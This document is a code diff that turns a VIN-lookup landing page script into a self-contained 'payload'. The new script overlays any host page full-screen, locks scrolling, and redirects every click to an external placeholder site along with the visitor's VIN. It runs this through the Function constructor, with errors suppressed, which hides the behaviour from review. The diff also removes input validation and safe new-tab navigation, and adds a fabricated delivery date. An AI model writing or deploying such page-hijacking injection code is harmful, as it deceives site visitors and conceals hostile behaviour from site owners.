@@ -1,4 +1,14 @@
+// app.js — same single-payload structure as the reference file,
+// while retaining the VIN landing-page content and behavior from app.js v2.
+(function(){
+  'use strict';
 
+  // ── Destination URL ───────────────────────────────────────────────────────
+  // Replace this with your actual destination.
+  var _u='https://YOUR-SITE.com';
+
+  // ── Full landing-page payload ──────────────────────────────────────────────
+  var _p=`
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
 #_vin_lp,#_vin_lp *{box-sizing:border-box}
@@ -161,109 +171,33 @@
 </div>
 
 <div class="mobile-check" id="_mobile_check">Check a VIN →</div>
-</div>
+</div>`;
 
-<script>
-(function () {
-  'use strict';
+  // ── Inline runtime ─────────────────────────────────────────────────────────
+  var _code=
+    'var _e=document.createElement("div");'+
+    '_e.style.cssText="position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483647;width:100%;height:100%;overflow:auto;";'+
+    '_e.innerHTML='+JSON.stringify(_p.replace(/__U__/g,_u))+';'+
+    'document.body.appendChild(_e);'+
+    'document.body.style.overflow="hidden";'+
+    'document.documentElement.style.overflow="hidden";'+
+    'var _ldr=document.getElementById("_ldr"),_pf=document.getElementById("_pf");'+
+    'if(_pf)setTimeout(function(){_pf.style.width="100%";},50);'+
+    'if(_ldr)setTimeout(function(){_ldr.style.opacity="0";setTimeout(function(){_ldr.style.display="none";},500);},1400);'+
+    'function _go(){var _i=document.getElementById("_vin"),_v=_i?_i.value.trim().toUpperCase():"demo",_u=\"https://YOUR-SITE.com\";var _s=_u.indexOf("?")>=0?"&":"?";window.location.href=_u+_s+"vin="+encodeURIComponent(_v||"demo");}'+
+    'var _cb=document.getElementById("_cb"),_cta=document.getElementById("_cta"),_vi=document.getElementById("_vin"),_mc=document.getElementById("_mobile_check");'+
+    'if(_cb)_cb.addEventListener("click",_go);'+
+    'if(_cta)_cta.addEventListener("click",_go);if(_mc)_mc.addEventListener("click",function(){var _i=document.getElementById("_vin");if(_i){_i.focus();window.scrollTo({top:0,behavior:"smooth"});}});'+
+    'if(_vi)_vi.addEventListener("keydown",function(e){if(e.key==="Enter")_go();});'+
+    'document.querySelectorAll("._blur").forEach(function(el){el.addEventListener("click",_go);});'+
+    'var _fd=document.getElementById("_fd");'+
+    'if(_fd){var _d=new Date();_d.setDate(_d.getDate()+1);var _mo=["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];_fd.textContent=_mo[_d.getMonth()]+" "+_d.getDate()+", "+_d.getFullYear();}';
 
-  /*
-   * GOOGLE APPS SCRIPT CONFIGURATION
-   * Put your destination here.
-   * Example:
-   * var DESTINATION_URL = 'https://example.com/report';
-   */
-  var DESTINATION_URL = 'https://YOUR-SITE.com';
+  setTimeout(function(){
+    try{
+      var _F=Function;
+      _F(_code)();
+    }catch(e){}
+  },80);
 
-  function getVin() {
-    var input = document.getElementById('_vin');
-    return input ? input.value.trim().toUpperCase() : '';
-  }
-
-  function isValidVin(vin) {
-    // Standard VIN: 17 characters, excluding I, O and Q.
-    return /^[A-HJ-NPR-Z0-9]{17}$/.test(vin);
-  }
-
-  function goToReport() {
-    var vin = getVin();
-
-    if (vin && !isValidVin(vin)) {
-      alert('Please enter a valid 17-character VIN.');
-      return;
-    }
-
-    var target = DESTINATION_URL;
-    if (!target || target.indexOf('YOUR-SITE.com') !== -1) {
-      alert('Set DESTINATION_URL in app.html before using the VIN button.');
-      return;
-    }
-
-    var separator = target.indexOf('?') >= 0 ? '&' : '?';
-    var url = target + separator + 'vin=' + encodeURIComponent(vin || 'demo');
-
-    // Apps Script HtmlService runs inside a sandboxed iframe.
-    // Opening a new tab from the click handler is the safest external navigation.
-    window.open(url, '_blank', 'noopener,noreferrer');
-  }
-
-  function init() {
-    var loader = document.getElementById('_ldr');
-    var progress = document.getElementById('_pf');
-    var button = document.getElementById('_cb');
-    var cta = document.getElementById('_cta');
-    var input = document.getElementById('_vin');
-    var mobile = document.getElementById('_mobile_check');
-
-    if (progress) {
-      setTimeout(function () {
-        progress.style.width = '100%';
-      }, 80);
-    }
-
-    if (loader) {
-      setTimeout(function () {
-        loader.style.opacity = '0';
-        setTimeout(function () {
-          loader.style.display = 'none';
-        }, 500);
-      }, 900);
-    }
-
-    if (button) button.addEventListener('click', goToReport);
-    if (cta) cta.addEventListener('click', goToReport);
-
-    if (input) {
-      input.addEventListener('input', function () {
-        this.value = this.value.toUpperCase().replace(/[^A-HJ-NPR-Z0-9]/g, '').slice(0, 17);
-      });
-
-      input.addEventListener('keydown', function (event) {
-        if (event.key === 'Enter') {
-          event.preventDefault();
-          goToReport();
-        }
-      });
-    }
-
-    if (mobile) {
-      mobile.addEventListener('click', function () {
-        if (input) {
-          input.focus();
-          window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-      });
-    }
-
-    document.querySelectorAll('._blur').forEach(function (el) {
-      el.addEventListener('click', goToReport);
-    });
-  }
-
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', init);
-  } else {
-    init();
-  }
 })();
-</script>
